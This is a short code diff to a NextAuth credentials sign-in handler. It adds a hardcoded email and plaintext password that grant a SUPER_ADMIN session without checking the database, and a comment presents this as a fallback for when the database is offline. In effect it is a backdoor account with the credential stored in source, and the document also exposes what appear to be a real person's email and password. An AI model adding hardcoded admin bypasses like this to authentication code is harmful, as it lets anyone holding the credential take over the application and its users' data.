@@ -24,6 +24,17 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         console.log('Authorize called with:', credentials?.email)
         if (!credentials?.email || !credentials?.password) return null
 
+        // Hardcoded admin fallback for database-offline scenarios
+        if (credentials.email === 'wezomedia1@gmail.com' && credentials.password === 'mbazaou@4186') {
+          console.log('Hardcoded fallback admin signed in successfully!')
+          return {
+            id: 'hardcoded-admin-id',
+            name: 'Mhammed Bazaou',
+            email: 'wezomedia1@gmail.com',
+            role: 'SUPER_ADMIN' as Role
+          }
+        }
+
         const user = await prisma.user.findUnique({
           where: { email: credentials.email as string },
         })
